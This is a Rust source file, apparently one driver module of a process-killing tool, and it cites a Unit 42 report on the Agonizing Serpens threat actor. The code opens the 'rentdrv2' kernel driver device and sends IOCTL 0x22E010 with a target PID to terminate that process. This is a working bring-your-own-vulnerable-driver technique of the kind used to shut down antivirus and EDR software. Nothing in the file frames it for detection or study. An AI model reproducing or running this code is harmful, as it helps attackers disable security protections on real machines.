// https://unit42.paloaltonetworks.com/agonizing-serpens-targets-israeli-tech-higher-ed-sectors/

use std::ffi::c_void;

use crate::win32::connect_to_device;
use crate::DriverBuilder;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::IO::DeviceIoControl;

#[repr(C, packed)]
struct RentDrv2DataExchange {
    level: u32,
    pid: usize,
    path: [u16; 1024], //wchar_t
}

impl RentDrv2DataExchange {
    fn new(pid: usize) -> RentDrv2DataExchange {
        RentDrv2DataExchange {
            level: 1,
            pid,
            path: [0; 1024],
        }
    }
}

pub struct RentDrv2 {
    device: HANDLE,
    pid: u32,
}

impl DriverBuilder for RentDrv2 {
    fn build(pid: u32) -> Result<Box<dyn DriverBuilder>, String> {
        let device = connect_to_device("\\\\.\\rentdrv2")?;

        return Ok(Box::new(RentDrv2 { device, pid }));
    }

    fn kill(&self) -> Result<(), String> {
        let req_data = RentDrv2DataExchange::new(self.pid as usize);

        let mut dw_bytes_returned: u32 = 0;

        if let Err(_) = unsafe {
            DeviceIoControl(
                self.device,
                0x22E010,
                Some(&req_data as *const _ as *const c_void),
                std::mem::size_of::<RentDrv2DataExchange>() as u32,
                None,
                0,
                Some(&mut dw_bytes_returned),
                None,
            )
        } {
            return Err("Could not kill process with PID ".to_owned() + &self.pid.to_string());
        }

        return Ok(());
    }
}
